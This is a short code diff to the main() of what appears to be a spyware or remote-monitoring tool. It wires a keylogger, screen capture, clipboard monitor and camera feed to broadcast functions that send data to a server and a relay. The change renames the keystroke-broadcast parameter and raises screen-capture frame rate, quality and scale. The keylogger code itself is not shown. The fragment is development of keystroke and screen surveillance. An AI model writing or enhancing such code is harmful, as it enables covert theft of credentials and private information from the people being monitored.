@@ -56,9 +56,9 @@ def main():
         server.broadcast_frame(b64)
         if relay: relay.broadcast_frame(b64)
 
-    def broadcast_key(char):
-        server.broadcast_key(char)
-        if relay: relay.broadcast_key(char)
+    def broadcast_key(data):
+        server.broadcast_key(data)
+        if relay: relay.broadcast_key(data)
 
     def broadcast_camera(b64):
         server.broadcast_camera(b64)
@@ -80,7 +80,7 @@ def main():
         relay.run()
 
     kl.Keylogger(broadcast_key).start()
-    capture = sc.ScreenCapture(broadcast_frame, fps=8, quality=35, scale=0.5)
+    capture = sc.ScreenCapture(broadcast_frame, fps=15, quality=65, scale=0.75)
     capture.attach_recorder(recorder)
     capture.start()
     cb.ClipboardMonitor(broadcast_clipboard).start()
